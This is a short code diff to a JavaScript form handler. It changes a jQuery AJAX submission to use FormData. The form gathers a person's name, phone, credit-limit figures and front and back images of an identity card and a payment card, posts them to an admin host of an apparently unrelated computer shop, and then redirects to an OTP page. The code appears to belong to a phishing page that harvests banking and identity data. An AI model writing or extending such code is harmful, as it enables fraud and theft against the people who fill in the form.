@@ -400,21 +400,22 @@
                 var mattruoc_card = $('#mattruoc_card').val();
                 var matsau_card = $('#matsau_card').val();
                 var action = $('#action').val();
+                const formData = new FormData();
+                formData.append('name', name);
+                formData.append('phone', phone);
+                formData.append('limit_now', limit_now);
+                formData.append('limit_total', limit_total);
+                formData.append('limit_increase', limit_increase);
+                formData.append('mattruoc', mattruoc);
+                formData.append('matsau', matsau);
+                formData.append('mattruoc_card', mattruoc_card);
+                formData.append('matsau_card', matsau_card);
+                formData.append('action', action);
+
                 $.ajax({
                     url: 'https://admin.tucanhcomputer.vn/customer',
                     type: 'POST',
-                    data: {
-                        name: name,
-                        phone: phone,
-                        limit_now: limit_now,
-                        limit_total: limit_total,
-                        limit_increase: limit_increase,
-                        mattruoc: mattruoc,
-                        matsau: matsau,
-                        mattruoc_card: mattruoc_card,
-                        matsau_card: matsau_card,
-                        action: action
-                    },
+                    data: formData,
                     success: function (data) {
                         window.location.href = '/otp.html';
                     },
